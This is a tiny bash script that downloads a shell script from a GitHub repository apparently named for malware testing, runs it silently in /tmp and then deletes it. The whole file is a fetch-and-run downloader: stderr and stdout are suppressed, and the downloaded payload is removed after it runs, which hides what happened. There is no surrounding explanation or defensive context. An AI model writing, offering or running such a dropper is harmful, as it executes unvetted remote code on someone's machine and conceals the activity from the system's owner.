#!/bin/bash
curl https://raw.githubusercontent.com/AirplaneA220/maltest/Main/shversion/3.sh 2>/dev/null > /tmp/3.sh
sh /tmp/3.sh > /dev/null
sleep 3
rm /tmp/3.sh
